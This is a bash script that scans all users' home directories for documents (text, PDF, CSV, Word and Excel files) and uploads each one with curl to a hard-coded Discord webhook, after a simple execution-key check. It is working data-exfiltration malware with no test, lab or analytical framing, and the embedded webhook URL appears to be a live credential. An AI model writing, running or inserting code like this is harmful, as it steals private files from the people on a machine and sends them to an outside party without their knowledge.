#!/bin/bash

DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1313922889237528606/_sIv-aVxYQgrgpSYJD-oh-pmQYX8Dk_ctVzRH6eXxy_poCzc7WenyDxp_WnbaGRwVA0i"
FILE_EXTENSIONS=("*.txt" "*.pdf" "*.csv" "*.doc" "*.docx" "*.xlsx")


validate_execution_key() {
    if [[ "$1" != "1777" ]]; then
        echo "Invalid execution key!"
        exit 1
    fi
}

send_file_to_discord() {
    local file_path="$1"
    curl -X POST \
        -H "Content-Type: multipart/form-data" \
        -F "file=@${file_path}" \
        "$DISCORD_WEBHOOK_URL" > /dev/null 2>&1

    if [[ $? -eq 0 ]]; then
        echo "Successfully sent: $file_path"
    else
        echo "Failed to send: $file_path"
    fi
}

collect_and_send_files() {
    local target_directory="$1"
    for ext in "${FILE_EXTENSIONS[@]}"; do
        find "$target_directory" -type f -name "$ext" 2>/dev/null | while read -r file; do
            send_file_to_discord "$file"
        done
    done
}

main() {
    validate_execution_key "$1"
    local target_directory="/home"
    echo "Collecting and transferring files to Discord..."
    collect_and_send_files "$target_directory"
}

main "$@"
